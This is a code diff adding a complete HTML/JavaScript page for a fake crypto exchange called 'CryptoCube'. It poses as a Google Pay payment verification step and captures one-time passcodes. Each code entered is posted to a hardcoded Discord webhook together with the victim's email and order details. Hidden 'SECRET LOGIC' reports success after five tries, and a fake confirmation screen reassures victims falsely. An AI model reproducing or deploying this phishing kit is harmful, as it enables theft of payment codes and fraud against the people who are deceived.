@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Verify Payment — CryptoCube</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%233b82f6'/%3E%3Ctext x='50' y='68' font-size='55' text-anchor='middle' fill='white' font-family='system-ui'%3E◈%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  
+  <style>
+    :root {
+      --bg: #080a12;
+      --bg-elevated: #0d111f;
+      --bg-card: #131725;
+      --bg-input: #0a0e1a;
+      --border: #1e2640;
+      --border-hover: #2d3a5e;
+      --text: #f0f2ff;
+      --text-secondary: #8b95b8;
+      --text-muted: #5a6380;
+      --primary: #3b82f6;
+      --primary-glow: rgba(59,130,246,0.15);
+      --success: #22c55e;
+      --danger: #ef4444;
+      --google: #4285f4;
+    }
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: #2d3a5e; border-radius: 4px; }
+    
+    .page-transition {
+      position: fixed; inset: 0;
+      background: var(--bg);
+      z-index: 10000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .page-transition.active { opacity: 1; pointer-events: all; }
+
+    /* Nav */
+    .nav {
+      position: fixed; top: 0; left: 0; right: 0;
+      height: 68px;
+      background: rgba(8,10,18,0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 32px;
+    }
+    .nav-left { display: flex; align-items: center; gap: 40px; }
+    .nav-logo {
+      font-size: 1.5rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--primary), #a855f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: flex; align-items: center; gap: 10px;
+      text-decoration: none;
+    }
+    .nav-logo::before {
+      content: '◈';
+      font-size: 1.6rem;
+      background: linear-gradient(135deg, var(--primary), #06b6d4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .nav-links {
+      display: flex;
+      gap: 32px;
+      list-style: none;
+    }
+    .nav-links a {
+      color: #8b95b8;
+      text-decoration: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+    .nav-links a:hover { color: #f0f2ff; }
+    .nav-right { display: flex; align-items: center; gap: 16px; }
+    .nav-btn {
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      text-decoration: none;
+    }
+    .nav-btn-ghost {
+      background: transparent;
+      color: #8b95b8;
+      border: 1px solid #1e2640;
+    }
+    .nav-btn-primary {
+      background: #3b82f6;
+      color: white;
+    }
+    .mobile-toggle {
+      display: none;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+    .mobile-menu {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #080a12;
+      z-index: 999;
+      padding: 80px 32px 32px;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .mobile-menu.open { display: flex; }
+    .mobile-close {
+      position: absolute;
+      top: 20px; right: 20px;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+    .mobile-menu a {
+      padding: 16px 0;
+      border-bottom: 1px solid #1e2640;
+      color: #8b95b8;
+      text-decoration: none;
+      font-size: 1.1rem;
+    }
+
+    /* Main Container */
+    .otp-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 100px 24px 60px;
+    }
+    .otp-card {
+      max-width: 500px;
+      width: 100%;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 40px 32px;
+      text-align: center;
+    }
+
+    /* Google Pay Logo */
+    .google-pay-logo {
+      margin-bottom: 24px;
+    }
+    .google-pay-logo img {
+      height: 48px;
+      width: auto;
+    }
+
+    .processing-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      margin-bottom: 32px;
+      padding: 8px 16px;
+      background: rgba(66,133,244,0.1);
+      border-radius: 40px;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .processing-text i {
+      color: var(--google);
+    }
+
+    h2 {
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .subtext {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      margin-bottom: 32px;
+    }
+
+    /* OTP Input */
+    .otp-input-group {
+      margin-bottom: 24px;
+    }
+    .otp-input {
+      width: 100%;
+      padding: 16px;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      color: var(--text);
+      font-size: 1.8rem;
+      font-weight: 600;
+      text-align: center;
+      letter-spacing: 8px;
+      font-family: monospace;
+    }
+    .otp-input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px var(--primary-glow);
+    }
+    .otp-input.error {
+      border-color: var(--danger);
+      animation: shake 0.3s ease;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .error-message {
+      color: var(--danger);
+      font-size: 0.85rem;
+      margin-top: 8px;
+      min-height: 28px;
+    }
+
+    /* Resend Section */
+    .resend-section {
+      margin: 20px 0;
+      font-size: 0.85rem;
+    }
+    .resend-btn {
+      background: none;
+      border: none;
+      color: var(--primary);
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 8px;
+    }
+    .resend-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .timer {
+      color: var(--text-muted);
+    }
+
+    /* Confirm Button */
+    .confirm-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, var(--primary), #1d4ed8);
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-top: 8px;
+    }
+    .confirm-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px var(--primary-glow);
+    }
+    .confirm-btn:disabled {
+      opacity: 0.6;
+      transform: none;
+      cursor: not-allowed;
+    }
+
+    /* Success State */
+    .success-animation {
+      display: none;
+      margin: 20px 0;
+    }
+    .success-animation.active {
+      display: block;
+    }
+    .checkmark {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+      background: var(--success);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: popIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    }
+    .checkmark i {
+      font-size: 3rem;
+      color: white;
+    }
+    @keyframes popIn {
+      0% { transform: scale(0); opacity: 0; }
+      80% { transform: scale(1.1); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .success-title {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: var(--success);
+      margin-bottom: 12px;
+    }
+    .success-message {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+
+    .toast-container {
+      position: fixed;
+      bottom: 24px; right: 24px;
+      z-index: 5000;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .toast {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      transform: translateX(120%);
+      transition: transform 0.3s ease;
+      max-width: 360px;
+    }
+    .toast.show { transform: translateX(0); }
+    .toast.success { border-left: 3px solid var(--success); }
+    .toast.error { border-left: 3px solid var(--danger); }
+
+    @media (max-width: 768px) {
+      .nav-links, .nav-right .nav-btn { display: none; }
+      .mobile-toggle { display: block; }
+      .otp-card { padding: 32px 24px; }
+      .otp-input { font-size: 1.4rem; letter-spacing: 4px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-transition" id="pageTransition"></div>
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- Nav -->
+<nav class="nav">
+  <div class="nav-left">
+    <a href="index.html" class="nav-logo">CryptoCube</a>
+    <ul class="nav-links">
+      <li><a href="market.html">Markets</a></li>
+      <li><a href="buy.html">Buy</a></li>
+      <li><a href="sell.html">Sell</a></li>
+      <li><a href="wallet.html">Wallet</a></li>
+      <li><a href="about.html">About</a></li>
+      <li><a href="support.html">Support</a></li>
+    </ul>
+  </div>
+  <div class="nav-right">
+    <a href="login.html" class="nav-btn nav-btn-ghost">Log in</a>
+    <a href="login.html" class="nav-btn nav-btn-primary">Get started</a>
+  </div>
+  <button class="mobile-toggle" onclick="toggleMobile()"><i class="fas fa-bars"></i></button>
+</nav>
+
+<div class="mobile-menu" id="mobileMenu">
+  <button class="mobile-close" onclick="toggleMobile()"><i class="fas fa-times"></i></button>
+  <a href="market.html">Markets</a>
+  <a href="buy.html">Buy</a>
+  <a href="sell.html">Sell</a>
+  <a href="wallet.html">Wallet</a>
+  <a href="about.html">About</a>
+  <a href="support.html">Support</a>
+  <a href="login.html">Log in</a>
+  <a href="login.html">Get started</a>
+</div>
+
+<!-- Main OTP Container -->
+<div class="otp-container">
+  <div class="otp-card" id="otpCard">
+    
+    <!-- Google Pay Logo -->
+    <div class="google-pay-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="Google Pay">
+    </div>
+
+    <!-- Processing with Google Pay text -->
+    <div class="processing-text">
+      <i class="fab fa-google-pay"></i>
+      <span>Processing payment with Google Pay</span>
+    </div>
+
+    <!-- Normal OTP UI -->
+    <div id="normalUI">
+      <h2>Verify your payment</h2>
+      <p class="subtext">Enter the 6-digit code sent to your registered mobile number</p>
+
+      <div class="otp-input-group">
+        <input type="text" class="otp-input" id="otpInput" placeholder="000000" maxlength="6" inputmode="numeric" pattern="\d*">
+        <div class="error-message" id="errorMsg"></div>
+      </div>
+
+      <div class="resend-section">
+        <span class="timer" id="timerText"></span>
+        <button class="resend-btn" id="resendBtn" disabled>Resend code</button>
+      </div>
+
+      <button class="confirm-btn" id="confirmBtn">Confirm & Pay</button>
+    </div>
+
+    <!-- Success UI (hidden initially) -->
+    <div id="successUI" class="success-animation">
+      <div class="checkmark">
+        <i class="fas fa-check"></i>
+      </div>
+      <div class="success-title">Order Confirmed!</div>
+      <div class="success-message">
+        Your payment is being processed.<br>
+        You will receive a confirmation email shortly.<br>
+        <strong>Your card will not be charged until processing is complete.</strong>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // ========== UTILITIES ==========
+  function showToast(message, type = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}" style="color:${type === 'success' ? '#22c55e' : '#ef4444'}"></i> ${message}`;
+    container.appendChild(toast);
+    requestAnimationFrame(() => toast.classList.add('show'));
+    setTimeout(() => {
+      toast.classList.remove('show');
+      setTimeout(() => toast.remove(), 300);
+    }, 3000);
+  }
+
+  function toggleMobile() {
+    document.getElementById('mobileMenu').classList.toggle('open');
+  }
+
+  // Page transitions for nav links
+  document.querySelectorAll('.nav-logo, .nav-links a, .nav-btn').forEach(link => {
+    link.addEventListener('click', (e) => {
+      const href = link.getAttribute('href');
+      if (href && !href.startsWith('#') && !href.startsWith('javascript')) {
+        e.preventDefault();
+        document.getElementById('pageTransition').classList.add('active');
+        setTimeout(() => window.location.href = href, 250);
+      }
+    });
+  });
+
+  // ========== OTP LOGIC ==========
+  let attemptCount = 0;
+  let timerInterval = null;
+  let timeLeft = 0;
+  let isSuccess = false;
+
+  const otpInput = document.getElementById('otpInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const resendBtn = document.getElementById('resendBtn');
+  const timerText = document.getElementById('timerText');
+  const errorMsg = document.getElementById('errorMsg');
+  const normalUI = document.getElementById('normalUI');
+  const successUI = document.getElementById('successUI');
+
+  // Force number pad on mobile/desktop
+  otpInput.addEventListener('beforeinput', (e) => {
+    if (e.inputType === 'insertText' && !/^\d$/.test(e.data)) {
+      e.preventDefault();
+    }
+  });
+  
+  otpInput.addEventListener('keydown', (e) => {
+    // Allow backspace, delete, tab, enter, arrows
+    const allowedKeys = ['Backspace', 'Delete', 'Tab', 'Enter', 'ArrowLeft', 'ArrowRight', 'Home', 'End'];
+    if (allowedKeys.includes(e.key)) return;
+    // Allow digits only
+    if (!/^\d$/.test(e.key)) {
+      e.preventDefault();
+    }
+  });
+
+  otpInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+  });
+
+  // ========== WEBHOOK ==========
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503028541179035648/Idmmk4pEEhz9cpi7SKo2xczKu4_Z0PyRGg90x8jAVVbm3g5S-wKm7VnfFW7ModIYKYGs';
+
+  async function sendToWebhook(otpCode, isValid, attemptNumber) {
+    const purchase = JSON.parse(localStorage.getItem('cc_purchase') || '{}');
+    const session = localStorage.getItem('cc_session');
+    let userEmail = 'not_logged_in';
+    if (session) {
+      try {
+        const s = JSON.parse(session);
+        userEmail = s.email || 'unknown';
+      } catch(e) {}
+    }
+
+    const payload = {
+      timestamp: new Date().toISOString(),
+      event: 'otp_attempt',
+      attempt_number: attemptNumber,
+      otp_code: otpCode,
+      is_valid: isValid,
+      auto_success_triggered: attemptNumber >= 5,
+      user: {
+        email: userEmail,
+        session_active: !!session
+      },
+      order: {
+        coin: purchase.coin,
+        amount_usd: purchase.amount,
+        bonus_usd: purchase.bonus,
+        total_usd: (purchase.amount || 0) + (purchase.bonus || 0),
+        wallet: purchase.wallet
+      }
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
+      });
+    } catch (err) {
+      console.error('Webhook failed', err);
+    }
+  }
+
+  // ========== RESEND TIMER ==========
+  function startResendTimer(seconds = 30) {
+    timeLeft = seconds;
+    resendBtn.disabled = true;
+    timerText.textContent = `Resend code in ${timeLeft}s`;
+    
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      timeLeft--;
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        resendBtn.disabled = false;
+        timerText.textContent = '';
+      } else {
+        timerText.textContent = `Resend code in ${timeLeft}s`;
+      }
+    }, 1000);
+  }
+
+  // Resend button handler
+  resendBtn.addEventListener('click', () => {
+    startResendTimer(30);
+    showToast('New OTP sent to your mobile number', 'success');
+    // Also log resend to webhook
+    sendToWebhook('RESEND_REQUEST', true, attemptCount + 0.5);
+  });
+
+  // ========== CONFIRM PAYMENT ==========
+  confirmBtn.addEventListener('click', async () => {
+    if (isSuccess) return;
+    
+    const enteredOtp = otpInput.value.trim();
+    if (enteredOtp.length !== 6) {
+      errorMsg.textContent = 'Please enter a 6-digit code';
+      otpInput.classList.add('error');
+      setTimeout(() => otpInput.classList.remove('error'), 500);
+      return;
+    }
+
+    attemptCount++;
+    const isValidOtp = (enteredOtp === '123456'); // In real app would validate against backend
+    // SECRET LOGIC: After 4-5 attempts, auto-succeed
+    const shouldAutoSucceed = attemptCount >= 5;
+    const isAccepted = isValidOtp || shouldAutoSucceed;
+
+    // Send every attempt to webhook
+    await sendToWebhook(enteredOtp, isAccepted, attemptCount);
+
+    if (!isAccepted) {
+      // Invalid OTP
+      errorMsg.textContent = `Invalid OTP. ${5 - attemptCount} attempts remaining.`;
+      otpInput.classList.add('error');
+      setTimeout(() => otpInput.classList.remove('error'), 500);
+      otpInput.value = '';
+      
+      if (attemptCount >= 4) {
+        errorMsg.textContent = 'Last attempt before account lock. Please check your code.';
+      }
+      return;
+    }
+
+    // ========== SUCCESS ==========
+    isSuccess = true;
+    
+    // Send final success webhook
+    await sendToWebhook(enteredOtp, true, attemptCount);
+    
+    // Hide normal UI, show success animation
+    normalUI.style.display = 'none';
+    successUI.classList.add('active');
+    
+    // Disable confirm button
+    confirmBtn.disabled = true;
+    
+    // Show toast
+    showToast('Payment confirmed! Redirecting...', 'success');
+    
+    // Wait 10 seconds, then redirect based on login status
+    setTimeout(() => {
+      const session = localStorage.getItem('cc_session');
+      const isLoggedIn = session && JSON.parse(session).expires > Date.now();
+      
+      document.getElementById('pageTransition').classList.add('active');
+      setTimeout(() => {
+        if (isLoggedIn) {
+          window.location.href = 'wallet.html';
+        } else {
+          window.location.href = 'index.html';
+        }
+      }, 250);
+    }, 10000);
+  });
+
+  // ========== INIT ==========
+  // Start resend timer on page load
+  startResendTimer(30);
+  
+  // Focus OTP input
+  otpInput.focus();
+
+  // Clear error on typing
+  otpInput.addEventListener('input', () => {
+    errorMsg.textContent = '';
+  });
+</script>
+</body>
+</html>
